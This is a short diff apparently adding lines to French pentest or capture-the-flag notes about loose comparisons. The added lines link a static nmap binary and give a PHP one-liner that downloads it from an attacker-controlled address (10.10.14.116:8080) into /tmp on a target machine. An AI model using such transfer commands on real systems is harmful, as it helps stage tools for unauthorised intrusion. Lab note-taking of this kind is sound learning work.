@@ -58,3 +58,6 @@ Le recours systématique à `===` pour les vérifications de tokens, hachages, i
 
 ![[Pasted image 20251209120607.png]]
 
+https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
+php -r "copy('http://10.10.14.116:8080/nmap.1', '/tmp/nmap');"
+
